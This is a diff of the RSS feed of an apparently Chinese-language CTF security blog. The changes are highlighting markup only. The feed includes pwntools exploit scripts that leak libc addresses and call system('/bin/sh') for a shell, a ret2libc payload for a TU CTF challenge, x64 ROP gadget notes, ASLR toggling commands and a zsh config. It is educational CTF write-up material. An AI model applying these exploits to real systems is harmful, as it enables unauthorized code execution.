-ptr_libc <span style="color:#f92672">=</span> u64(leak(printf_got))
-d <span style="color:#f92672">=</span> DynELF(leak, ptr_libc)
-system <span style="color:#f92672">=</span> d<span style="color:#f92672">.</span>lookup(<span style="color:#e6db74">&#39;system&#39;</span>)
-
-print r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;quit&#39;</span>)
-r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;7&#39;</span>)
-r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> p64(system) )
-
-r<span style="color:#f92672">.</span>interactive()
-</code></pre></div><h3 id="aslr">ASLR</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>printf_got <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x601020</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">leak</span>(addr):
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;2&#39;</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(p64(addr) )
+</span></span><span style="display:flex;"><span>    s <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvline_contains(<span style="color:#e6db74">&#39;hex: 0x&#39;</span>)[<span style="color:#ae81ff">5</span>:]<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>    s <span style="color:#f92672">=</span> p64( int(s,<span style="color:#ae81ff">16</span>) )
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> s
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;localhost&#39;</span>,<span style="color:#ae81ff">4000</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ptr_libc <span style="color:#f92672">=</span> u64(leak(printf_got))
+</span></span><span style="display:flex;"><span>d <span style="color:#f92672">=</span> DynELF(leak, ptr_libc)
+</span></span><span style="display:flex;"><span>system <span style="color:#f92672">=</span> d<span style="color:#f92672">.</span>lookup(<span style="color:#e6db74">&#39;system&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;quit&#39;</span>)
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;7&#39;</span>)
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> p64(system) )
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><h3 id="aslr">ASLR</h3>
 <ul>
 <li>aslr on</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">sudo sysctl -w kernel.randomize_va_space=2
-</code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sudo sysctl -w kernel.randomize_va_space=2
+</span></span></code></pre></div><ul>
 <li>aslr off</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">sudo sysctl -w kernel.randomize_va_space=0
-</code></pre></div><p>假如有ASLR，本的的話 32bit可以使用<code>ulimit -s unlimited</code>關閉，或是可以利用<code>puts</code>，leak <code>.got</code> 段上的資料 同一個 libc function 之間的偏移是固定的</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sudo sysctl -w kernel.randomize_va_space=0
+</span></span></code></pre></div><p>假如有ASLR，本的的話 32bit可以使用<code>ulimit -s unlimited</code>關閉，或是可以利用<code>puts</code>，leak <code>.got</code> 段上的資料 同一個 libc function 之間的偏移是固定的</p>
 <p>一般常出現的函數 :</p>
 <ul>
 <li>__libc_start_main</li>
@@ -373,41 +373,41 @@ r<span style="color:#f92672">.</span>interactive()
 </ul>
 <h2 id="x64-通用gadgets">x64 通用gadgets</h2>
 <p>這些函數都可以利用</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-diff" data-lang="diff">_init
-_start
-call_gmon_start
-deregister_tm_clones
-register_tm_clones
-__do_global_dtors_aux
-frame_dummy
-__libc_csu_init
-__libc_csu_fini
-_fini
-</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-diff" data-lang="diff">ROPgadget --binary ./binary --depth 100
-</code></pre></div><p>不從版本 gadgets 會不太一樣，不過都可以通用，在於__libc_csu_init()</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-diff" data-lang="diff"><span style="display:flex;"><span>_init
+</span></span><span style="display:flex;"><span>_start
+</span></span><span style="display:flex;"><span>call_gmon_start
+</span></span><span style="display:flex;"><span>deregister_tm_clones
+</span></span><span style="display:flex;"><span>register_tm_clones
+</span></span><span style="display:flex;"><span>__do_global_dtors_aux
+</span></span><span style="display:flex;"><span>frame_dummy
+</span></span><span style="display:flex;"><span>__libc_csu_init
+</span></span><span style="display:flex;"><span>__libc_csu_fini
+</span></span><span style="display:flex;"><span>_fini
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-diff" data-lang="diff"><span style="display:flex;"><span>ROPgadget --binary ./binary --depth 100
+</span></span></code></pre></div><p>不從版本 gadgets 會不太一樣，不過都可以通用，在於__libc_csu_init()</p>
 <p>假如有些指令切一半的話也可以對reg做操作</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-diff" data-lang="diff">&lt;__libc_csu_init&gt;:
-5b                       pop    rbx
-5d                       pop    rbp
-41 5c                    pop    r12   -&gt;   pop rsp (5c)
-41 5d                    pop    r13   -&gt;   pop rbp (5d)
-41 5e                    pop    r14   -&gt;   pop rsi (5e)
-41 5f                    pop    r15   -&gt;   pop rdi (5f)
-c3                       ret
-</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-diff" data-lang="diff">mov    rbx,QWORD PTR [rsp+0x8]
-mov    rbp,QWORD PTR [rsp+0x10]
-mov    r12,QWORD PTR [rsp+0x18]
-mov    r13,QWORD PTR [rsp+0x20]
-mov    r14,QWORD PTR [rsp+0x28]
-mov    r15,QWORD PTR [rsp+0x30]
-add    rsp,0x38
-ret
-</code></pre></div><p>利用這些gadgets可以把 r12-r15 控好，<code>call qword ptr [r12+rbx*8]</code>的時候可以將<code>rbp等於1，rbx等於0</code>才會繼續ret下去，這部分可以自己跟一次比較清楚</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">4c 89 ea                 mov    rdx,r13
-4c 89 f6                 mov    rsi,r14
-44 89 ff                 mov    edi,r15d
-41 ff 14 dc              call   QWORD PTR [r12+rbx*8]
-</code></pre></div><h2 id="one-gadgets-rce">One gadgets RCE</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-diff" data-lang="diff"><span style="display:flex;"><span>&lt;__libc_csu_init&gt;:
+</span></span><span style="display:flex;"><span>5b                       pop    rbx
+</span></span><span style="display:flex;"><span>5d                       pop    rbp
+</span></span><span style="display:flex;"><span>41 5c                    pop    r12   -&gt;   pop rsp (5c)
+</span></span><span style="display:flex;"><span>41 5d                    pop    r13   -&gt;   pop rbp (5d)
+</span></span><span style="display:flex;"><span>41 5e                    pop    r14   -&gt;   pop rsi (5e)
+</span></span><span style="display:flex;"><span>41 5f                    pop    r15   -&gt;   pop rdi (5f)
+</span></span><span style="display:flex;"><span>c3                       ret
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-diff" data-lang="diff"><span style="display:flex;"><span>mov    rbx,QWORD PTR [rsp+0x8]
+</span></span><span style="display:flex;"><span>mov    rbp,QWORD PTR [rsp+0x10]
+</span></span><span style="display:flex;"><span>mov    r12,QWORD PTR [rsp+0x18]
+</span></span><span style="display:flex;"><span>mov    r13,QWORD PTR [rsp+0x20]
+</span></span><span style="display:flex;"><span>mov    r14,QWORD PTR [rsp+0x28]
+</span></span><span style="display:flex;"><span>mov    r15,QWORD PTR [rsp+0x30]
+</span></span><span style="display:flex;"><span>add    rsp,0x38
+</span></span><span style="display:flex;"><span>ret
+</span></span></code></pre></div><p>利用這些gadgets可以把 r12-r15 控好，<code>call qword ptr [r12+rbx*8]</code>的時候可以將<code>rbp等於1，rbx等於0</code>才會繼續ret下去，這部分可以自己跟一次比較清楚</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>4c 89 ea                 mov    rdx,r13
+</span></span><span style="display:flex;"><span>4c 89 f6                 mov    rsi,r14
+</span></span><span style="display:flex;"><span>44 89 ff                 mov    edi,r15d
+</span></span><span style="display:flex;"><span>41 ff 14 dc              call   QWORD PTR [r12+rbx*8]
+</span></span></code></pre></div><h2 id="one-gadgets-rce">One gadgets RCE</h2>
 <p>在一些特定的libc中藏有可以直接執行execv(&quot;/bin/sh&quot;)，可以觀察一下libc中有用到execv的附近藏有&quot;/bin/sh&quot;的字串，有機會可以直接成功</p>
 ]]></content:encoded>
     </item>
@@ -419,53 +419,53 @@ ret
       
       <guid>https://blog.zet.tw/posts/2016-05-21-tu-ctf-where-heretics-suffer/</guid>
       <description>拿到這題的時候已經是一隻binary了，這是用比較新的gcc編的，對於function call 有一些新的機制，如下：
-80485cb: 8d 4c 24 04 lea ecx,[esp+0x4] 80485cf: 83 e4 f0 and esp,0xfffffff0 80485d2: ff 71 fc push DWORD PTR [ecx-0x4] 80485d5: 55 push ebp 80485d6: 89 e5 mov ebp,esp 80485d8: 51 push ecx 80485d9: 83 ec 34 sub esp,0x34 ...... 8048682: b8 00 00 00 00 mov eax,0x0 8048687: 8b 4d fc mov ecx,DWORD PTR [ebp-0x4] 804868a: c9 leave 804868b: 8d 61 fc lea esp,[ecx-0x4] 804868e: c3 ret 可以看到在初始化的時候lea ecx,[esp+0x4]，會把esp得值放到ecx中 之後再把ecx放到stack上，當我們overflow以後會把原本得直也蓋掉</description>
+ 80485cb: 8d 4c 24 04 lea ecx,[esp+0x4]  80485cf: 83 e4 f0 and esp,0xfffffff0  80485d2: ff 71 fc push DWORD PTR [ecx-0x4]  80485d5: 55 push ebp  80485d6: 89 e5 mov ebp,esp  80485d8: 51 push ecx  80485d9: 83 ec 34 sub esp,0x34   ......   8048682: b8 00 00 00 00 mov eax,0x0  8048687: 8b 4d fc mov ecx,DWORD PTR [ebp-0x4]  804868a: c9 leave  804868b: 8d 61 fc lea esp,[ecx-0x4]  804868e: c3 ret 可以看到在初始化的時候lea ecx,[esp+0x4]，會把esp得值放到ecx中 之後再把ecx放到stack上，當我們overflow以後會把原本得直也蓋掉</description>
       <content:encoded><![CDATA[<p>拿到這題的時候已經是一隻binary了，這是用比較新的gcc編的，對於function call 有一些新的機制，如下：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-markdown" data-lang="markdown"> 80485cb:       8d 4c 24 04             lea    ecx,[esp+0x4]
- 80485cf:       83 e4 f0                and    esp,0xfffffff0
- 80485d2:       ff 71 fc                push   DWORD PTR [ecx-0x4]
- 80485d5:       55                      push   ebp
- 80485d6:       89 e5                   mov    ebp,esp
- 80485d8:       51                      push   ecx
- 80485d9:       83 ec 34                sub    esp,0x34
-
- ......
-
- 8048682:       b8 00 00 00 00          mov    eax,0x0
- 8048687:       8b 4d fc                mov    ecx,DWORD PTR [ebp-0x4]
- 804868a:       c9                      leave
- 804868b:       8d 61 fc                lea    esp,[ecx-0x4]
- 804868e:       c3                      ret
-</code></pre></div><p>可以看到在初始化的時候<code>lea    ecx,[esp+0x4]</code>，會把esp得值放到<code>ecx</code>中 之後再把<code>ecx</code>放到stack上，當我們overflow以後會把原本得直也蓋掉</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-markdown" data-lang="markdown"><span style="display:flex;"><span> 80485cb:       8d 4c 24 04             lea    ecx,[esp+0x4]
+</span></span><span style="display:flex;"><span> 80485cf:       83 e4 f0                and    esp,0xfffffff0
+</span></span><span style="display:flex;"><span> 80485d2:       ff 71 fc                push   DWORD PTR [ecx-0x4]
+</span></span><span style="display:flex;"><span> 80485d5:       55                      push   ebp
+</span></span><span style="display:flex;"><span> 80485d6:       89 e5                   mov    ebp,esp
+</span></span><span style="display:flex;"><span> 80485d8:       51                      push   ecx
+</span></span><span style="display:flex;"><span> 80485d9:       83 ec 34                sub    esp,0x34
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> ......
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> 8048682:       b8 00 00 00 00          mov    eax,0x0
+</span></span><span style="display:flex;"><span> 8048687:       8b 4d fc                mov    ecx,DWORD PTR [ebp-0x4]
+</span></span><span style="display:flex;"><span> 804868a:       c9                      leave
+</span></span><span style="display:flex;"><span> 804868b:       8d 61 fc                lea    esp,[ecx-0x4]
+</span></span><span style="display:flex;"><span> 804868e:       c3                      ret
+</span></span></code></pre></div><p>可以看到在初始化的時候<code>lea    ecx,[esp+0x4]</code>，會把esp得值放到<code>ecx</code>中 之後再把<code>ecx</code>放到stack上，當我們overflow以後會把原本得直也蓋掉</p>
 <p>題目滿好心的有提供很多東西所以可以算出<code>system</code>的位置，也有給buffer的位置，所以我們直接把 ret address 填到 buffer 開頭的位置這樣esp，控制好以後esp才不會爛掉，之後照正常疊 <code>ret2libc</code> 就行了</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
-
-e <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;/lib32/libc.so.6&#39;</span>)
-<span style="color:#75715e">#e = ELF(&#39;./libc.so.6&#39;)</span>
-
-r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;127.0.0.1&#34;</span>,<span style="color:#ae81ff">4000</span>)
-r<span style="color:#f92672">.</span>recvlines(<span style="color:#ae81ff">2</span>)
-puts <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()[<span style="color:#ae81ff">47</span>:<span style="color:#ae81ff">57</span>]
-print <span style="color:#e6db74">&#39;puts : &#39;</span>,puts
-puts <span style="color:#f92672">=</span> int(puts, <span style="color:#ae81ff">16</span>)
-
-buffer <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()[<span style="color:#f92672">-</span><span style="color:#ae81ff">10</span>:]
-print <span style="color:#e6db74">&#39;buffer :&#39;</span>,buffer
-buffer <span style="color:#f92672">=</span> int(buffer,<span style="color:#ae81ff">16</span>)
-
-system <span style="color:#f92672">=</span> puts <span style="color:#f92672">-</span> ( e<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;puts&#39;</span>] <span style="color:#f92672">-</span> e<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;system&#39;</span>] )
-print <span style="color:#e6db74">&#39;system : &#39;</span>,hex(system)
-
-payload <span style="color:#f92672">=</span> p32(system) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p32(buffer <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span><span style="color:#f92672">*</span><span style="color:#ae81ff">7</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0</span>)
-payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>
-payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">44</span><span style="color:#f92672">-</span>len(payload))
-print len(payload)
-
-
-r<span style="color:#f92672">.</span>sendline( payload <span style="color:#f92672">+</span> p32( buffer <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>)  )
-
-r<span style="color:#f92672">.</span>interactive()
-</code></pre></div>]]></content:encoded>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>e <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;/lib32/libc.so.6&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#e = ELF(&#39;./libc.so.6&#39;)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;127.0.0.1&#34;</span>,<span style="color:#ae81ff">4000</span>)
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>recvlines(<span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>puts <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()[<span style="color:#ae81ff">47</span>:<span style="color:#ae81ff">57</span>]
+</span></span><span style="display:flex;"><span>print <span style="color:#e6db74">&#39;puts : &#39;</span>,puts
+</span></span><span style="display:flex;"><span>puts <span style="color:#f92672">=</span> int(puts, <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()[<span style="color:#f92672">-</span><span style="color:#ae81ff">10</span>:]
+</span></span><span style="display:flex;"><span>print <span style="color:#e6db74">&#39;buffer :&#39;</span>,buffer
+</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">=</span> int(buffer,<span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>system <span style="color:#f92672">=</span> puts <span style="color:#f92672">-</span> ( e<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;puts&#39;</span>] <span style="color:#f92672">-</span> e<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;system&#39;</span>] )
+</span></span><span style="display:flex;"><span>print <span style="color:#e6db74">&#39;system : &#39;</span>,hex(system)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> p32(system) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p32(buffer <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span><span style="color:#f92672">*</span><span style="color:#ae81ff">7</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">44</span><span style="color:#f92672">-</span>len(payload))
+</span></span><span style="display:flex;"><span>print len(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendline( payload <span style="color:#f92672">+</span> p32( buffer <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>)  )
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div>]]></content:encoded>
     </item>
     
     <item>
@@ -479,10 +479,10 @@ r<span style="color:#f92672">.</span>interactive()
 git clone https://github.com/aquynh/capstone.git $ ./make.sh $ sudo ./make.sh install </description>
       <content:encoded><![CDATA[<p>把<code>install.sh</code>裡面capstone的地方註解掉後執行</p>
 <p>下載capstone</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">git clone https://github.com/aquynh/capstone.git
-</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">$ ./make.sh
-$ sudo ./make.sh install
-</code></pre></div>]]></content:encoded>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>git clone https://github.com/aquynh/capstone.git
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ ./make.sh
+</span></span><span style="display:flex;"><span>$ sudo ./make.sh install
+</span></span></code></pre></div>]]></content:encoded>
     </item>
     
     <item>
@@ -504,12 +504,12 @@ References
 <p>可以參考下方的參考資料</p>
 <p>References</p>
 <hr>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">http://inaz2.hatenablog.com/entry/2014/07/11/004655
-http://inaz2.hatenablog.com/entry/2014/07/12/000007
-http://inaz2.hatenablog.com/entry/2014/07/13/025626
-https://code.google.com/archive/p/alpha3/
-https://nets.ec/Ascii_shellcode
-</code></pre></div>]]></content:encoded>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>http://inaz2.hatenablog.com/entry/2014/07/11/004655
+</span></span><span style="display:flex;"><span>http://inaz2.hatenablog.com/entry/2014/07/12/000007
+</span></span><span style="display:flex;"><span>http://inaz2.hatenablog.com/entry/2014/07/13/025626
+</span></span><span style="display:flex;"><span>https://code.google.com/archive/p/alpha3/
+</span></span><span style="display:flex;"><span>https://nets.ec/Ascii_shellcode
+</span></span></code></pre></div>]]></content:encoded>
     </item>
     
     <item>
@@ -521,59 +521,59 @@ https://nets.ec/Ascii_shellcode
       <description>用過prezto與oh-my-zsh的zsh framework以後雖然很方便但是預設會載入一堆插件跟資料，導致開啟shell的時候會有延遲的感覺，尤其進入龐大的git資料夾的時候，速度慢到可以
 嘗試自己寫zshrc把會用到的寫進去就好，速度提升不少，git方面採用比較好的做法，先把原本要輸出在Prompt的git訊息輸出到tmp裡面，等跑完以後在資料撈回Prompt
 大約如下：
-setopt prompt_subst # enable command substition in prompt autoload -Uz vcs_info zstyle &amp;#39;:vcs_info:*&amp;#39; enable bzr git hg svn zstyle &amp;#39;:vcs_info:*&amp;#39; check-for-changes true zstyle &amp;#39;:vcs_info:*&amp;#39; stagedstr &amp;#39;%F{green}●%f&amp;#39; zstyle &amp;#39;:vcs_info:*&amp;#39; unstagedstr &amp;#39;%F{yellow}●%f&amp;#39; zstyle &amp;#39;:vcs_info:*&amp;#39; formats &amp;#39; %b%c%u&amp;#39; zstyle &amp;#39;:vcs_info:*&amp;#39; actionformats &amp;#34; - [%b%c%u|%F{cyan}%a%f]&amp;#34; zstyle &amp;#39;:vcs_info:(sv[nk]|bzr):*&amp;#39; branchformat &amp;#39;%b|%F{cyan}%r%f&amp;#39; zstyle &amp;#39;:vcs_info:git*+set-message:*&amp;#39; hooks git_status ASYNC_PROC=0 ASYNC_DATA=&amp;#34;${TMPPREFIX}-prompt_sorin_data&amp;#34; function precmd() { function async() { vcs_info # save to temp file printf &amp;#34;%s&amp;#34; &amp;#34;${vcs_info_msg_0_}&amp;#34; &amp;gt; $ASYNC_DATA # signal parent kill -s USR1 $$ } # do not clear RPROMPT, let it persist # kill child if necessary if [[ &amp;#34;${ASYNC_PROC}&amp;#34; !</description>
+setopt prompt_subst # enable command substition in prompt autoload -Uz vcs_info  zstyle &amp;#39;:vcs_info:*&amp;#39; enable bzr git hg svn zstyle &amp;#39;:vcs_info:*&amp;#39; check-for-changes true zstyle &amp;#39;:vcs_info:*&amp;#39; stagedstr &amp;#39;%F{green}●%f&amp;#39; zstyle &amp;#39;:vcs_info:*&amp;#39; unstagedstr &amp;#39;%F{yellow}●%f&amp;#39; zstyle &amp;#39;:vcs_info:*&amp;#39; formats &amp;#39; %b%c%u&amp;#39; zstyle &amp;#39;:vcs_info:*&amp;#39; actionformats &amp;#34; - [%b%c%u|%F{cyan}%a%f]&amp;#34; zstyle &amp;#39;:vcs_info:(sv[nk]|bzr):*&amp;#39; branchformat &amp;#39;%b|%F{cyan}%r%f&amp;#39; zstyle &amp;#39;:vcs_info:git*+set-message:*&amp;#39; hooks git_status  ASYNC_PROC=0 ASYNC_DATA=&amp;#34;${TMPPREFIX}-prompt_sorin_data&amp;#34; function precmd() {   function async() {  vcs_info  # save to temp file  printf &amp;#34;%s&amp;#34; &amp;#34;${vcs_info_msg_0_}&amp;#34; &amp;gt; $ASYNC_DATA  # signal parent  kill -s USR1 $$  }  # do not clear RPROMPT, let it persist  # kill child if necessary  if [[ &amp;#34;${ASYNC_PROC}&amp;#34; !</description>
       <content:encoded><![CDATA[<p>用過<code>prezto</code>與<code>oh-my-zsh</code>的zsh framework以後雖然很方便但是預設會載入一堆插件跟資料，導致開啟shell的時候會有延遲的感覺，尤其進入龐大的git資料夾的時候，速度慢到可以</p>
 <p>嘗試自己寫zshrc把會用到的寫進去就好，速度提升不少，git方面採用比較好的做法，先把原本要輸出在<code>Prompt</code>的git訊息輸出到<code>tmp</code>裡面，等跑完以後在資料撈回<code>Prompt</code></p>
 <p>大約如下：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-zsh" data-lang="zsh">setopt prompt_subst <span style="color:#75715e"># enable command substition in prompt</span>
-autoload -Uz vcs_info
-
-zstyle <span style="color:#e6db74">&#39;:vcs_info:*&#39;</span> enable bzr git hg svn
-zstyle <span style="color:#e6db74">&#39;:vcs_info:*&#39;</span> check-for-changes true
-zstyle <span style="color:#e6db74">&#39;:vcs_info:*&#39;</span> stagedstr <span style="color:#e6db74">&#39;%F{green}●%f&#39;</span>
-zstyle <span style="color:#e6db74">&#39;:vcs_info:*&#39;</span> unstagedstr <span style="color:#e6db74">&#39;%F{yellow}●%f&#39;</span>
-zstyle <span style="color:#e6db74">&#39;:vcs_info:*&#39;</span> formats <span style="color:#e6db74">&#39;  %b%c%u&#39;</span>
-zstyle <span style="color:#e6db74">&#39;:vcs_info:*&#39;</span> actionformats <span style="color:#e6db74">&#34; - [%b%c%u|%F{cyan}%a%f]&#34;</span>
